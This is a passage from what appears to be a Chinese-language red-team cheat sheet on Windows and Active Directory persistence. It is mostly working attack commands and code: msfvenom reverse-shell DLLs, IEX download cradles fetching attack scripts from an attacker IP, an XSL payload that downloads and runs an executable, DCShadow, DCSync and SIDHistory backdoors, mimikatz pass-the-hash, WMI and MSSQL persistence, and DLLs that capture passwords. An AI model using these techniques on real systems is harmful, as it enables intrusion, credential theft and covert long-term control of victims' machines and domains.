HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\GUID\InprocServer32 (默认)
REG_EXPAND_SZ &quot; DLL的路径&quot; -ThreadingModel REG_SZ &quot;Both&quot;
HKLM \ SOFTWARE \ Microsoft \ AMSI \ Providers \ GUID
Regsvr32使用超管权限
</code></pre>
<p><img src="723.png" alt="image"></p>
<pre><code>一旦注册，Dll将被加载到任何涉及AMSI和SampleAmsiProvider::Scan方法的进程中，比如在程序中设定，在powershell下发送字符串，触发scan方法，当发送字符串为我们设定的字符串的时候就触发恶意DLL
</code></pre>
<p><img src="724.png" alt="image"><br><img src="725.png" alt="image"></p>
<h3 id="DLL劫持计划任务"><a href="#DLL劫持计划任务" class="headerlink" title="DLL劫持计划任务"></a>DLL劫持计划任务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[CmdletBinding(SupportsShouldProcess &#x3D; $True, ConfirmImpact &#x3D; &#39;Medium&#39;)]</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Mandatory &#x3D; $True)]</span><br><span class="line">[ValidateNotNullOrEmpty()]</span><br><span class="line">[String]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[Switch]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath &#x3D; &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span><br><span class="line">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Warning &quot;Failed to create registry key, exiting&quot;</span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose
重启权限可维持
</code></pre>
<h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><h4 id="Powershell-6"><a href="#Powershell-6" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code>生成DLL
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll
&gt;use exploit/multi/handler
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;Powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1&#39;); Invoke-DllInjection -ProcessID pid -Dll .\1.dll&quot;
</code></pre>
<h4 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h4><pre><code>生成DLL
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
使用如下命令注入进程
&gt;InjectProc.exe dll_inj qq.dll xx.exe(存在的进程)
</code></pre>
<p><img src="477.png" alt="image"></p>
<h3 id="通过控制面板加载项维持权限"><a href="#通过控制面板加载项维持权限" class="headerlink" title="通过控制面板加载项维持权限"></a>通过控制面板加载项维持权限</h3><pre><code>编译为dll，这里是弹框测试
</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Cplapplet</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function">LONG <span class="title">Cplapplet</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HWND hwndCpl,</span></span></span><br><span class="line"><span class="function"><span class="params">    UINT msg,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam1,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam2</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;inject control panel.&quot;</span>, <span class="string">&quot;Control Panel&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Cplapplet</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="680.png" alt="image"></p>
<pre><code>添加到注册表中，只要运行control命令打开控制面板即可加载dll
reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs&quot; /v spotless /d &quot;C:\xxx\dll.dll&quot; /f
</code></pre>
<p><img src="681.png" alt="image"></p>
<h2 id="通过自定义-net垃圾回收机制进行DLL注入"><a href="#通过自定义-net垃圾回收机制进行DLL注入" class="headerlink" title="通过自定义.net垃圾回收机制进行DLL注入"></a>通过自定义.net垃圾回收机制进行DLL注入</h2><pre><code>低权限用户可指定.net应用程序使用自定义垃圾收集器（GC），一个自定义GC可以以COMPLUS_GCName此环境变量指定，只需将此环境变量指向到恶意DLL，自定义GC的DLL需要一个名为GC_VersionInfo的导出表。
下面是个弹框DLL
</code></pre>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VersionInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UINT32 MajorVersion;</span><br><span class="line">    UINT32 MinorVersion;</span><br><span class="line">    UINT32 BuildVersion;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* Name;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">GC_VersionInfo</span><span class="params">(VersionInfo * info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    info-&gt;BuildVersion = <span class="number">0</span>;</span><br><span class="line">    info-&gt;MinorVersion = <span class="number">0</span>;</span><br><span class="line">    info-&gt;BuildVersion = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;giao&quot;</span>, <span class="string">&quot;giao&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="686.png" alt="image"></p>
<pre><code>后执行任意.net程序可加载此DLL
</code></pre>
<p><img src="687.png" alt="image"></p>
<pre><code>当然也可以加载shellcode
https://github.com/am0nsec/MCGC
</code></pre>
<p><img src="688.png" alt="image"><br><img src="689.png" alt="image"><br><img src="690.png" alt="image"></p>
<h3 id="Windows-FAX-DLL-Injection"><a href="#Windows-FAX-DLL-Injection" class="headerlink" title="Windows FAX DLL Injection"></a>Windows FAX DLL Injection</h3><pre><code>恶意DLL改名为fxsst.dll放置在c:\windows\目录即可实现对explorer.exe的劫持
</code></pre>
<h3 id="DSRM-注册表ACL后门"><a href="#DSRM-注册表ACL后门" class="headerlink" title="DSRM+注册表ACL后门"></a>DSRM+注册表ACL后门</h3><pre><code>&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
允许DSRM账户远程访问
https://github.com/HarmJ0y/DAMP
效果：域内任何用户可读取域控hash
system权限执行
&gt;psexec.exe -accepteula -s -i -d cmd.exe
域控制器执行
PS&gt;Add-RemoteRegBackdoor -ComputerName 域控名 -Trustee &#39;S-1-1-0&#39; –Verbose
</code></pre>
<p><img src="478.png" alt="image"></p>
<pre><code>域内机器执行
https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1
PS&gt; Get-RemoteLocalAccountHash -ComputerName 域控 –Verbose
</code></pre>
<p><img src="479.png" alt="image"></p>
<pre><code>域控上执行
&gt;reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
</code></pre>
<p><img src="480.png" alt="image"></p>
<pre><code>PTH攻击，mimikatz需以管理员身份启动
&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd&quot; exit
</code></pre>
<p><img src="481.png" alt="image"></p>
<h3 id="DCShadow-amp-SID-History"><a href="#DCShadow-amp-SID-History" class="headerlink" title="DCShadow&amp;SID History"></a>DCShadow&amp;SID History</h3><pre><code>http://192.168.0.107/ps/nishang/ActiveDirectory/Set-DCShadowPermissions.ps1
DCShadow攻击是通过更改AD架构，使域内一台机器伪造成域控。
此脚本可以通过修改AD对象提供DCShadow攻击的最小权限。
运行此脚本需要DA(Domain Administrator)权限，可以使指定用户不需要DA权限使用mimikatz。
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户:y
域控执行
&gt;Set-DCShadowPermissions -Fakedc sub2k8 -Object dc -username y –Verbose
注册sub2k8为假DC，给予用户y从sub2k8修改dc的计算机对象的权限。
</code></pre>
<p><img src="482.png" alt="image"></p>
<pre><code>在sub2k8上，以本地system权限启动一个mimikatz会话，以zone\y权限启动一个mimikatz会话。
</code></pre>
<p><img src="483.png" alt="image"><br><img src="484.png" alt="image"></p>
<pre><code>System权限窗口执行dcshadow攻击，修改dc的计算机属性
Zone\y权限窗口用于推送
添加域管理
通过修改安全标识符，将域内普通用户y提升为域管理用户
&gt;lsadump::dcshadow /object:y /attribute:primaryGroupID /value:512
</code></pre>
<p><img src="485.png" alt="image"><br><img src="486.png" alt="image"><br><img src="487.png" alt="image"></p>
<pre><code>Zone\y推送
&gt;lsadump::dcshadow /push
</code></pre>
<p><img src="488.png" alt="image"></p>
<pre><code>此时在域控上查询可见y用户已经加入域管理组。
</code></pre>
<p><img src="489.png" alt="image"></p>
<pre><code>添加SIDHistory后门
记录域管理SID
</code></pre>
<p><img src="490.png" alt="image"></p>
<pre><code>&gt;Set-DCShadowPermissions -FakeDC sub2k8 -Object y -Username y -Verbose
</code></pre>
<p><img src="491.png" alt="image"></p>
<pre><code>&gt;lsadump::dcshadow /object:y /attribute:sidhistory /value:S-1-5-21-2346829310-1781191092-2540298887-500
推送
&gt;lsadump::dcshadow /push
</code></pre>
<p><img src="492.png" alt="image"></p>
<pre><code>测试
</code></pre>
<p><img src="493.png" alt="image"></p>
<pre><code>域控中通过mimikatz命令可查询到SIDHistory
</code></pre>
<p><img src="494.png" alt="image"></p>
<pre><code>删除SIDHistory的方法
PS&gt;Get-ADUser -Filter &#123;name -eq &quot;y&quot;&#125; –Properties sidhistory|foreach &#123;Set-ADuser $_ –remove @&#123;sidhistory=&quot;S-1-5-21-2346829310-1781191092-2540298887-500&quot;&#125;&#125;
</code></pre>
<p><img src="495.png" alt="image"><br><img src="496.png" alt="image"></p>
<pre><code>删除功能规则
输入的规则后面加参数-remove即可。
</code></pre>
<p><img src="497.png" alt="image"></p>
<h3 id="DCSync后门"><a href="#DCSync后门" class="headerlink" title="DCSync后门"></a>DCSync后门</h3><pre><code>服务器管理器找到域-&gt;查看-&gt;启用高级功能-&gt;右键属性-&gt;安全-&gt;everyone完全控制
&gt;mimikatz.exe &quot;lsadump::dcsync /domain:zone.com /user:administrator&quot; exit
</code></pre>
<p><img src="498.png" alt="image"></p>
<pre><code>或使用powerview添加一条ACL(域控执行)
&gt;Add-DomainObjectAcl -TargetIdentity &quot;DC=ZONE,DC=COM&quot; -PrincipalIdentity 域内用户 -Rights DCSync -Verbose 
</code></pre>
<p><img src="499.png" alt="image"></p>
<pre><code>使用此账户在域内任意主机可使用mimikatz的dcsync功能导出凭据
</code></pre>
<p><img src="500.png" alt="image"></p>
<pre><code>移除ACL
&gt;Remove-DomainObjectAcl -TargetIdentity &quot;DC=zone,DC=com&quot; -PrincipalIdentity 用户 -Rights DCSync -Verbose
</code></pre>
<h3 id="Netsh-Helper-DLL"><a href="#Netsh-Helper-DLL" class="headerlink" title="Netsh Helper DLL"></a>Netsh Helper DLL</h3><pre><code>https://github.com/outflanknl/NetshHelperBeacon
https://github.com/rtcrowley/Offensive-Netsh-Helper
</code></pre>
<h4 id="MSFvenom生成DLL"><a href="#MSFvenom生成DLL" class="headerlink" title="MSFvenom生成DLL"></a>MSFvenom生成DLL</h4><pre><code>生成DLL格式木马
</code></pre>
<p><img src="501.png" alt="image"></p>
<pre><code>传至靶机执行命令
&gt;netsh add helper C:\Windows\Temp\help.dll
</code></pre>
<p><img src="502.png" alt="image"></p>
<h4 id="MSF-web-delivery"><a href="#MSF-web-delivery" class="headerlink" title="MSF+web_delivery"></a>MSF+web_delivery</h4><pre><code>关闭netsh权限不会掉，调用的powershell
#use exploit/multi/script/web_delivery
&gt;set target 2            #PSH
&gt;set payload windows/x64/meterpreter/reverse_tcp
&gt;set lhost 192.168.0.107
&gt;set lport 12345
</code></pre>
<p><img src="503.png" alt="image"></p>
<pre><code>Visual Studio新建空白DLL项目，源文件添加现有文件
https://github.com/rtcrowley/Offensive-Netsh-Helper/blob/master/netshlep.cpp 
复制生成的代码进文件中，配置管理器新建x64位数后生成解决方案，配置类型选择位动态库复制DLL到靶机执行
</code></pre>
<p><img src="504.png" alt="image"><br><img src="505.png" alt="image"></p>
<pre><code>&gt;netsh add helper helper.dll
</code></pre>
<p><img src="506.png" alt="image"></p>
<h4 id="MSF-amp-Shellcode"><a href="#MSF-amp-Shellcode" class="headerlink" title="MSF&amp;Shellcode"></a>MSF&amp;Shellcode</h4><pre><code>关闭netsh后权限会掉
https://github.com/outflanknl/NetshHelperBeacon
MSFvenom生成.c格式
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f c -o /var/www/html/1.c
Visual Studio打开项目
若系统是64位需设置配置管理器为64位项目，反之32(解决方案右键属性)
</code></pre>
<p><img src="507.png" alt="image"></p>
<pre><code>将MSF生成shellcode粘贴进相应位置后生成解决方案。
</code></pre>
<p><img src="508.png" alt="image"><br><img src="509.png" alt="image"></p>
<pre><code>会在项目目录x64/Release下生成dll
复制DLL到靶机system32目录下，执行命令
&gt;netsh add helper C:\Windows\System32\NetshHelperBeacon.dll
</code></pre>
<p><img src="510.png" alt="image"></p>
<pre><code>只要启动netsh就会触发
</code></pre>
<p><img src="511.png" alt="image"></p>
<h3 id="MSSQL后门"><a href="#MSSQL后门" class="headerlink" title="MSSQL后门"></a>MSSQL后门</h3><pre><code>注册表自启动
&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegRun -Verbose -Name Update -Command &#39;c:\windows\temp\Update.exe&#39; -Instance &quot;zone.com\sub2k8&quot;&quot;
重启MSSQL上线(需重启服务)
http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1
&gt;powershell -ep bypass 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Persist-StartupSp.psm1&#39;) 
&gt;Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance &quot;zone.com\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot; 远程木马脚本可用CS/Empire生成
&gt;net stop mssqlserver
&gt;net start mssqlserver
映像劫持
&gt;powershell -nop -ep bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/PowerUpSQL.ps1&#39;);Get-SQLPersistRegDebugger -Verbose -FileName sethc.exe -Command &quot;c:\windows\system32\cmd.exe&quot; -Instance &quot;zone.com\sub2k8&quot;&quot;
DDL事件触发
&gt;powershell -exec bypass 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/PowerUpSQL/Invoke-SqlServer-Persist-TriggerDDL.psm1&#39;) 
&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot;zone\sub2k8&quot; -PsCommand &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.0.107/xxxx&#39;)&quot;  远程木马文件可用CS/Empire生成
&gt;Invoke-SqlServer-Persist-TriggerDDL -Verbose -SqlServerInstance &quot; zone\sub2k8&quot; -Remove   移除后门
</code></pre>
<h3 id="NSSM"><a href="#NSSM" class="headerlink" title="NSSM"></a>NSSM</h3><pre><code>http://www.nssm.cc/release/nssm-2.24.zip
NSSM封装可执行程序为系统服务
&gt;nssm install 服务名称会自动弹出设置
</code></pre>
<p><img src="512.png" alt="image"></p>
<pre><code>Path选择powershell的路径，arguments直接输入参数。
启动服务
&gt;nssm start 服务名称
</code></pre>
<p><img src="513.png" alt="image"></p>
<pre><code>会上线
</code></pre>
<p><img src="514.png" alt="image"></p>
<pre><code>重启电脑，权限也会维持
删除服务
&gt;nssm remove &lt;servicename&gt;
</code></pre>
<p><img src="515.png" alt="image"></p>
<h3 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h3><pre><code>https://github.com/secretsquirrel/SigThief
&gt;python sigthief.py -i 被窃取的文件 -t 要添加签名的恶意文件 -o 保存文件
&gt;python sigthief.py -i rarext.dll -t rarextdwa.dll -o 1.dll
</code></pre>
<p><img src="516.png" alt="image"><br><img src="517.png" alt="image"><br><img src="518.png" alt="image"><br><img src="519.png" alt="image"></p>
<h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><pre><code>Meterpreter&gt; run metsvc -A
在C:Windows\TEMP下随机生成目录三个文件，创建服务metsvc 31337端口
连接后门
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/metsvc_bind_tcp
Msf&gt;set rhost 192.168.1.2
Msf&gt;set rport 31337
Msf&gt;run
删除服务
Meterpreter &gt; run metsvc –r
</code></pre>
<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><pre><code>Meterpreter&gt;run persistence -X -i 10 -r 192.168.1.9 -p 4444
-X系统启动时运行
-i每隔10秒尝试连接服务端
连接后门
Msf&gt;use exploit/multi/handler
Msf&gt;set payload windows/meterpreter/reverse_tcp
Msf&gt;set lhost 192.168.1.1
Msf&gt;set lport 4444
Msf&gt;run
</code></pre>
<h3 id="HookPasswordChangeNotify"><a href="#HookPasswordChangeNotify" class="headerlink" title="HookPasswordChangeNotify"></a>HookPasswordChangeNotify</h3><pre><code>使用VS2015开发环境，MFC设置为在静态库中使用MFC
编译工程，生成HookPasswordChange.dll
https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
在代码尾部添加如下代码：
&gt;Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
并命名为HookPasswordChangeNotify.ps1
上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll
管理员权限执行
&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
C:\Windows\Temp下可以找到passwords.txt
&amp;
https://gitee.com/RichChigga/PasswordchangeNotify
上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll 管理员权限执行：
&gt;PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
在C:\Windows\System32 新建文件system.ini第一行是连接的ip 第二行是端口
</code></pre>
<p><img src="520.png" alt="image"></p>
<h3 id="NPPSpy记录密码"><a href="#NPPSpy记录密码" class="headerlink" title="NPPSpy记录密码"></a>NPPSpy记录密码</h3><pre><code>https://github.com/gtworek/PSBits/blob/master/PasswordStealing/NPPSpy/NPPSPy.c
默认保存位置是C盘根目录，可以修改重新编译
</code></pre>
<p><img src="729.png" alt="image"></p>
<pre><code>将DLL放入system32文件夹内
</code></pre>
<p><img src="730.png" alt="image"></p>
<pre><code>执行ps1脚本自动添加注册表
</code></pre>
<p><img src="731.png" alt="image"></p>
<pre><code>无需重启
</code></pre>
<p><img src="732.png" alt="image"></p>
<h3 id="Password-Filter-DLL"><a href="#Password-Filter-DLL" class="headerlink" title="Password Filter DLL"></a>Password Filter DLL</h3><pre><code>https://github.com/3gstudent/PasswordFilter
visualstudio生成解决方案
DLL放在%windir%\system32\下
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa下的Notification Packages，添加Win32Project3
</code></pre>
<p><img src="521.png" alt="image"></p>
<pre><code>&gt;REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot;
&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v &quot;Notification Packages&quot; /t REG_MULTI_SZ /d &quot;scecli\0rassfm\0Win32Project3&quot; /f
重启之后只要修改用户的密码，即可记录
</code></pre>
<p><img src="522.png" alt="image"></p>
<pre><code>文件默认在C盘根目录，可在源码中修改
</code></pre>
<p><img src="523.png" alt="image"></p>
<h3 id="WMIC事件订阅"><a href="#WMIC事件订阅" class="headerlink" title="WMIC事件订阅"></a>WMIC事件订阅</h3><pre><code>每隔30秒加载一次payload
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;,CommandLineTemplate=&quot;远程调用(powershell,regsvr32,mshta等)&quot;
&gt;wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;
</code></pre>
<p><img src="524.png" alt="image"></p>
<pre><code>重启维持
卸载后门
&gt;Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&#39;BotFilter82&#39;&quot; | Remove-WmiObject -Verbose
&gt;Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#39;BotConsumer23&#39;&quot; | Remove-WmiObject -Verbose
&gt;Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &#39;%BotFilter82%&#39;&quot; | Remove-WmiObject -Verbose
</code></pre>
<h3 id="WMI-Persistence"><a href="#WMI-Persistence" class="headerlink" title="WMI-Persistence"></a>WMI-Persistence</h3><pre><code>https://gitee.com/RichChigga/WMI-Persistence
cobalt strike -&gt;payload generator-&gt;powershell(use x64)
</code></pre>
<p><img src="525.png" alt="image"></p>
<pre><code>attack-&gt;文件下载，文件选择payload generator的脚本，local uri为随意文件
</code></pre>
<p><img src="526.png" alt="image"></p>
<pre><code>生成后地址替换进WMI-Persistence脚本内
</code></pre>
<p><img src="527.png" alt="image"></p>
<pre><code># powershell -exec bypass
PS &gt; Import-Module .\WMI-Persistence.ps1
PS &gt; Install-Persistence
</code></pre>
<p><img src="528.png" alt="image"></p>
<pre><code>PS &gt; Check-WMI  重启后即可上线system权限(要等待4-6分钟)
</code></pre>
<p><img src="529.png" alt="image"></p>
<pre><code>自定义上线
</code></pre>
<p><img src="530.png" alt="image"></p>
<pre><code>attack-&gt;文件下载，exe木马指定为文件。local uri为随意文件，wmi.xsl放在web目录
</code></pre>
<p><img src="531.png" alt="image"></p>
<pre><code>修改wmi.xsl
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe /c certutil -urlcache -split -f http://192.168.0.107/load.jpg %temp%/load.exe &amp; %temp%/load.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/load.jpg delete&quot;,0);</span><br><span class="line">    ]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="532.png" alt="image"></p>
<pre><code>WMI-Persistence脚本修改payload地址为wmi.xsl
$finalPayload=&quot; wmic os get /FORMAT:`&quot;$Payload`&quot;&quot;
</code></pre>
<p><img src="533.png" alt="image"></p>
<pre><code>&gt;powershell -exec bypass
PS &gt; Import-Module .\WMI-Persistence.ps1
PS &gt; Install-Persistence
PS &gt; Check-WMI
PS &gt; Remove-Persistence 删除模块
重启后即可上线
</code></pre>
<p><img src="534.png" alt="image"></p>
<h3 id="Invoke-Tasksbackdoor"><a href="#Invoke-Tasksbackdoor" class="headerlink" title="Invoke-Tasksbackdoor"></a>Invoke-Tasksbackdoor</h3><pre><code>&gt;powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2&quot;
&gt; powershell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.103/Invoke-taskBackdoor.ps1&#39;);Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2&quot;
</code></pre>
<p><img src="535.png" alt="image"></p>
<h3 id="Invoke-ADSBackdoor"><a href="#Invoke-ADSBackdoor" class="headerlink" title="Invoke-ADSBackdoor"></a>Invoke-ADSBackdoor</h3><pre><code>使用ADS创建一个隐藏文件，创建一个计划任务每隔一分钟请求一次攻击。
